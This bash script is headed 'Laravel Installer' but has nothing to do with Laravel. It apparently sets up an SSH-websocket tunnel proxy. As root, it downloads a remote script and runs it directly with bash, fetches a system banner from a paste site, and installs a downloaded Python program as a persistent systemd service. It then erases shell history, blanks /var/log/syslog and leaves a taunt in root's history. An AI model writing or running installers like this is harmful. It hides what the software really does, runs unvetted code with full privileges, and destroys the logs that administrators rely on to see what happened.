#!/bin/bash
# Laravel Installer
# Script by Juan
# 
# Illegal selling and redistribution of this script is strictly prohibited
# Please respect author's Property
# Binigay sainyo ng libre, ipamahagi nyo rin ng libre.
#
#

# Install AutoScript
function ssh() {
    bash -c "$(wget -qO- https://raw.githubusercontent.com/Projectmarkallen/projectmark/main/ssh-script.sh)"




    rm -f /etc/banner
    wget -qO /etc/banner https://pastegen.com/raw/FNrBBTyxGF
    dos2unix -q /etc/banner
    service ssh restart
    service sshd restart
    service dropbear restart
}
ssh

function service() {
# Getting Proxy Template
wget -q -O /usr/local/bin/markws https://github.com/Projectmarkallen/projectmark/raw/main/services.py
chmod +x /usr/local/bin/markws
}
service

function service1() {
# Installing Service
cat << END > /etc/systemd/system/markws.service 
[Unit]
Description=Project Seve
Documentation=https://google.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/bin/python -O /usr/local/bin/markws
Restart=on-failure

[Install]
WantedBy=multi-user.target
END
}
service1

function setting() {
sed -i "/DEFAULT_HOST = '127.0.0.1:443'/c\DEFAULT_HOST = '127.0.0.1:550'" /usr/local/bin/markws

systemctl restart nginx
systemctl daemon-reload
systemctl enable markws
systemctl restart markws
}
setting

function remove() {
echo "" > .bash_history 
history -c
echo '' > /var/log/syslog
}
remove

clear

rm /root/.bash_history
echo 'UTUT MU' > /root/.bash_history

 echo "꧁MARK KING DURAN AUTOSCRIPT꧂"
 echo "SSH WEBSOCKET INSTALLED"
 echo "SABIHIN MO SALAMAT MASTER"
 echo "THIS IS NOT FOR SALE"
 echo "CREDITS: BONSCRIPT AND JUAN(GVPNHUB)"
 echo "PROJECT SEVE(ORIGINAL)"
